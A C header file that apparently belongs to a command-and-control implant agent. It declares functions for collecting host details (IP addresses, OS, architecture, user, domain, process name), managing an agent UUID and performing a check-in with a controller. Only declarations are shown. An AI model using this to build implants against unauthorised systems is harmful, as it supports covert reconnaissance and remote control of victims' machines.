#ifndef CHECKIN_H
#define CHECKIN_H

#include <windows.h>
#include "Package.h"
#include "Parser.h"

// Action byte for checkin
#define ACTION_CHECKIN 0xF1

// Architecture identifiers
#define ARCH_X86    1
#define ARCH_X64    2
#define ARCH_ARM    3

// Checkin response status
#define STATUS_SUCCESS  0x00
#define STATUS_FAILURE  0x01

// System info gathering functions
UINT32* GetIPAddresses(PUINT32 count);
PCHAR   GetOSName(VOID);
BYTE    GetArchitecture(VOID);
PCHAR   GetHostName_(VOID);      // Underscore to avoid conflict with winsock
PCHAR   GetUserName_(VOID);      // Underscore to avoid conflict with windows.h
PWCHAR  GetDomainName(VOID);
PCHAR   GetProcessName(VOID);

// UUID management
VOID setUUID(PCHAR newUUID);

// Parse checkin response and update UUID
// Returns TRUE if response is valid
BOOL parseCheckin(PParser responseParser);

// Main checkin function
// Returns TRUE if checkin succeeded and updates agentID with new UUID
BOOL DoCheckin(VOID);

#endif // CHECKIN_H
